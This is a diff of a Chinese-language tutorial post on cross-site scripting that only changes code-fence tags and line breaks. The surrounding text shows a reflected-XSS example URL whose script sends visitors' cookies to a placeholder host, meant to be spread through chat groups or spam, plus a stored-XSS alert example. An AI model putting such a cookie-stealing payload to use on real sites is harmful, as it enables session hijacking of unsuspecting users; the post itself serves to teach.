@@ -24,7 +24,7 @@ tags:
 2. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。
 3. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：
 
-```
+```markdown
 http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie='+document.cookie</script>
 PS：这个地址当然是没效的，只是举例子而已。
 ```
@@ -43,8 +43,9 @@ PS：这个地址当然是没效的，只是举例子而已。
 例子：
 1. 发一篇文章，里面包含了恶意脚本
 
-```
-今天天气不错啊！<script>alert('handsome boy')</script>
+```markdown
+今天天气不错啊！  
+<script>alert('handsome boy')</script>
 ```
 
 2. 后端没有对文章进行过滤，直接保存文章内容到数据库。
